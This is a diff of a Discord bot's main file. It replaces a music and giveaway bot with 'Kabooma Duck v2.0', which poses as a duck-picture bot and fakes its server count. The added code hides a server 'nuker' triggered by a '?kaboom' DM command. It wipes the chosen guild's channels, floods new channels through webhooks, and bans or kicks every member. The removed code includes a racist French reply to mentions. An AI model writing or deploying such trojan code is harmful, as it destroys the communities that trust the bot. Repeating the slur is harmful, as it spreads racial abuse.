@@ -1,134 +1,183 @@
-const Discord = require('discord.js');
-const { Client, Collection, GatewayIntentBits, EmbedBuilder, Partials, ChannelType, ButtonStyle, ButtonBuilder, ActionRowBuilder } = Discord;
-const config = require('./config')
-const { Player } = require('discord-player');
-const client = new Client({
-intents: [Object.keys(GatewayIntentBits)],
-partials: [Object.keys(Partials)],
+const { Client, Events, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, StringSelectMenuBuilder, ActivityType } = require('discord.js')
+let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json') // Kabooma Duck Config v2.0 / config.json / Updated 7.25.2023 / Check README for info
+const axios = require('axios').default 
+// CMD Dependencies
+const chalk = require('chalk')
+const figlet = require('figlet')
+
+if (!advancedOptions.enabled) {
+    advancedOptions = require('./otherConfig/defaultAdvanced.json').advancedOptions
+}
+
+const client = new Client({ intents: [   
+        GatewayIntentBits.DirectMessages, 
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.MessageContent, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.GuildWebhooks
+    ], partials: [
+        Partials.Channel
+    ] })
+
+function registercmds() {
+    const { SlashCommandBuilder } = require('@discordjs/builders')
+    const { REST } = require('@discordjs/rest')
+    const { Routes } = require('discord-api-types/v9')
+    const { clientID, token } = require('./config.json')
+
+    const commands = [
+    	new SlashCommandBuilder().setName('ping').setDescription('Replies with pong!'),
+    	new SlashCommandBuilder().setName('duck').setDescription('Generates a random duck!'),
+    ]
+	.map(command => command.toJSON())
+
+    const rest = new REST({ version: '9' }).setToken(token)
+
+    rest.put(Routes.applicationCommands(clientID), { body: commands })
+    	.then(() => console.log('Successfully registered application commands.'))
+    	.catch(console.error())
+}
+
+client.once(Events.ClientReady, c => {
+    console.clear()
+	console.log(chalk.yellowBright(figlet.textSync('Kabooma Duck', { font: '4Max' })))
+    console.log(chalk.redBright(`Version 2.0 | Logged in as ${client.user.tag} / ${client.user.id}`))
+    console.log(chalk.redBright('Press Ctrl+C to exit. | Admins may use ?kaboom in bot DMs'))
+    registercmds()
+    client.user.setActivity(`${fakeServers} servers!`, { type: ActivityType.Watching })
 });
 
-client.player = new Player(client, config.opt.discordPlayer);
-client.player.extractors.loadDefault();
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return
 
-const logs = require('discord-logs');
-logs(client, {
-    debug: true
-});
+    const { commandName } = interaction
 
-const InvitesTracker = require('@androz2091/discord-invites-tracker');
-const tracker = InvitesTracker.init(client, {
-    fetchGuilds: true,
-    fetchVanity: true,
-    fetchAuditLogs: true
-});
+    if (commandName === 'ping') {
+        var embed = new EmbedBuilder()
+        .setTitle("Pong!")
+        .setDescription(`Bot latency: ${Math.abs(interaction.createdTimestamp - Date.now())}ms\nAPI latency: ${Math.round(client.ws.ping)}ms`)
+        .setColor("#fceb02")
 
-tracker.on('guildMemberAdd', (member, type, invite) => {
+		await interaction.reply({ embeds: [embed] })
+    } else if (commandName === 'duck') {
+        var responses = ['Quack!', 'What is storytime called when you read to ducklings? Ducktales. 🤣', `What's a duck's favorite ballet? The Nutquacker! 🤣`, 'I have served you, master.', `Here's another goddamn duck I guess.`, 'FINE! I will give you another duck.', 'As you wish.', 'Okie dokie!', 'Quack Quack', 'QUACK QUACK QUACK']
 
-  const welcomeChannel = member.guild.channels.cache.find((ch) => ch.id === '1096914159746158712');
+        await interaction.reply('Thinking...')
 
-  if(type === 'normal'){
-      welcomeChannel.send(`Welcome ${member}! You were invited by <@${invite.inviter.id}>!`);
-  }
+        axios.get('https://random-d.uk/api/v2/random')
+        .then(async response => {
+            var random = Math.floor(Math.random() * (responses.length + 1))
 
-  else if(type === 'vanity'){
-      welcomeChannel.send(`Welcome ${member}! You joined using a custom invite!`);
-  }
+            var embed = new EmbedBuilder()
+            .setTitle(`${botName} - Duck`)
+            .setDescription(responses[random])
+            .setImage(response.data.url)
+            .setColor('#fceb02')
 
-  else if(type === 'permissions'){
-      welcomeChannel.send(`Welcome ${member}! I can't figure out how you joined because I don't have the "Manage Server" permission!`);
-  }
-
-  else if(type === 'unknown'){
-      welcomeChannel.send(`Welcome ${member}! I can't figure out how you joined the server...`);
-  }
-
-});
-
-const { GiveawaysManager } = require("discord-giveaways");
-client.giveawaysManager = new GiveawaysManager(client, {
-  storage: './gvw/giveaways.json',
-  default: {
-    botsCanWin: false,
-    embedColor: "#575cc7",
-    reaction: "🎉",
-    lastChance: {
-      enabled: true,
-      content: `⚠️ **Dernière chance d'entrer**`,
-      threshold: 5000,
-      embedColor: '#575cc7'
+            await interaction.editReply({embeds: [embed], content: ' '})
+        })
     }
-  }
-});
+})
 
-client.giveawaysManager.on("giveawayReactionAdded", (giveaway, member, reaction) => {
-    member.send('Votre participation a bien été prise en compte')
-    console.log(`${member.user.tag} entered giveaway #${giveaway.messageId} (${reaction.emoji.name})`);
-});
+// NUKER BELOW
+client.on('messageCreate', async message => {
+    if (message.channel.type == 1) {
+        if (message.content != '?kaboom') return
+        if (!admins.includes(message.author.id)) return
 
-client.giveawaysManager.on("giveawayReactionRemoved", (giveaway, member, reaction) => {
-    console.log(`${member.user.tag} unreact to giveaway #${giveaway.messageId} (${reaction.emoji.name})`);
-});
+        console.log(chalk.blueBright(`[INFO] ${message.author.tag} opened the nuke panel.`))
 
-client.giveawaysManager.on("giveawayEnded", (giveaway, winners) => {
-    console.log(`Giveaway #${giveaway.messageId} ended! Winners: ${winners.map((member) => member.user.username).join(', ')}`);
-});
+        var guildNames = client.guilds.cache.map(guild => guild.name)
+        var guildIDs = client.guilds.cache.map(guild => guild.id )
+        var opts = []
 
+        for (let i = 0; i < guildNames.length; i++) {
+            opts.push({
+                label: guildNames[i],
+                value: guildIDs[i],
+                description: `Guild ID: ${guildIDs[i]}`
+            })
+        }
 
+        var embed = new EmbedBuilder()
+        .setTitle('KABOOMA DUCK NUKE PANEL')
+        .setAuthor({name: 'Kabooma Duck v2.0 by RatWithAFace'})
+        .setColor('#fc00bd')
+        .setDescription('Welcome to the Kabooma Duck Nuke Panel. Please select a guild to nuke.')
 
-client.on("messageCreate", (message) => {
-  if (message.author.bot) return false;
+        var component = new ActionRowBuilder()
+        .addComponents(
+            new StringSelectMenuBuilder()
+            .setCustomId('guild')
+            .setPlaceholder('Select a guild.')
+            .addOptions(opts)
+        )
 
-  if (message.content.includes("noir") || message.content.includes("negro"))
+        await message.reply({embeds: [embed], components: [component]})
+    }
+})
 
-  if (message.mentions.has(client.user.id)) {
- 
-      message.reply("nique les noir^^");
-  }
-});
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isStringSelectMenu()) return
 
+    await interaction.reply('KABOOMING!')
+    console.log(chalk.blueBright(`[INFO] A nuke was initiated on guild ID ${interaction.values[0]}.`))
 
+    var guild = client.guilds.cache.get(interaction.values[0])
 
+    guild.setName(advancedOptions.server.nameChange)
+    guild.setIcon(advancedOptions.server.iconChange)
+    if (guild.banner != null) {
+        guild.setBanner(advancedOptions.server.bannerChange)
+    }
 
-process.on("unhandledRejection", (reason) => {
-  console.log("An unhandled rejection occurred in the main process:");
-  console.log(reason.stack ? `${reason.stack}` : `${reason}`);
-});
-process.on("uncaughtException", (err) => {
-  console.log("An uncaught exception occurred in the main process:");
-  console.log(err.stack ? `${err.stack}` : `${err}`);
-});
-process.on("uncaughtExceptionMonitor", (err) => {
-  console.log("An uncaught exception monitor occurred in the main process:");
-  console.log(err.stack ? `${err.stack}` : `${err}`);
-});
-process.on("beforeExit", (code) => {
-  console.log("The process is about to exit with code: " + code);
-});
-process.on("exit", (code) => {
-  console.log("The process exited with code: " + code);
-});
+    var gChannels = guild.channels.cache.map(channel => channel.id)
 
-client.color    = "#575cc7"
-client.discord  = Discord;
-client.commands = new Collection();
-client.slash    = new Collection();
-client.config   = require('./config');
-client.cwd      = require('process').cwd();
+    async function webhookSpam(webhook) { 
+        var wInterval = setInterval(() => {
+            try {
+                webhook.send(advancedOptions.webhook.message)
+            } catch (error) {
+                throw error
+            }
+        }, 500);
+        setTimeout(() => {
+            clearInterval(wInterval)
+        }, 300000)
+    }
+    
+    for (let i = 0; i < gChannels.length; i++) {
+        guild.channels.cache.get(gChannels[i]).delete()
+    }
 
-// LOAD COMMENDS AND EVENTS
-const { loadEvents } = require("./src/handlers");
-const { loadCommands } = require("./src/handlers");
-const { loadSlashCommands } = require("./src/handlers");
+    for (let loop = 0; loop < advancedOptions.channels.amount; loop++) {
+        try {
+            guild.channels.create({name: `${advancedOptions.channels.channelNames}-${loop}`}).then(async channel => {
+                setTimeout(() => {
+                    channel.createWebhook({name: advancedOptions.webhook.name, avatar: advancedOptions.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
+                }, 300)
+            })
+        } catch (error) {
+            loop--
+            throw error
+        }
+    }
+    
+    
 
+    if (advancedOptions.banning.enabled) {
+        var gMembers = guild.members.cache.map(member => member.id)
 
+        for (let i = 0; i < gMembers.length; i++) {
+            var member = guild.members.cache.get(gMembers[i])
+            if (member.bannable) {
+                member.ban({reason: advancedOptions.banning.banReason})
+            } else if (member.kickable) {
+                member.kick(advancedOptions.banning.banReason)
+            }
+        }
+    }
+    
+})
 
-// Error Handling
-
-client.login(config.token).then(() => {
-    // LOAD COMMENDS AND EVENTS
-    loadSlashCommands(client);
-    loadCommands(client);
-    loadEvents(client);
-});;
-
-module.exports = client;
+client.login(token)
